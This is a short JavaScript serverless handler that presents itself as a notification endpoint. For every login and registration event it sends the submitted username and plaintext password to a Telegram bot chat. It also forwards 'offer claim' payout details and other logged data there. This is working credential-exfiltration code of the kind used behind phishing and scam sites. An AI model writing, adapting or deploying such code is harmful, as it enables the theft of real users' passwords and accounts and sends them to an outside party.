import axios from 'axios';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'method_not_allowed' });

  const { type, username, password, payload } = req.body || {};

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn('Telegram env vars missing');
    return res.status(500).json({ error: 'telegram_not_configured' });
  }

  try {
    let text = '';
    if (type === 'login' || type === 'registration') {
      text = `<b>${type.toUpperCase()}</b>\nUsername: ${username}\nPassword: ${password}`;
    } else if (type === 'offer_claim') {
      text = `<b>OFFER CLAIM</b>\nUser: ${username}\nOffer: ${payload && payload.name}\nOfferId: ${payload && payload.id}\nPayout: ${payload && payload.payout}`;
    } else {
      text = `<b>LOG</b>\nType: ${type}\nData: ${JSON.stringify(payload || {})}`;
    }

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'HTML'
    });

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('notify failed', err && err.toString());
    return res.status(500).json({ error: 'notify_failed', detail: err.message });
  }
}
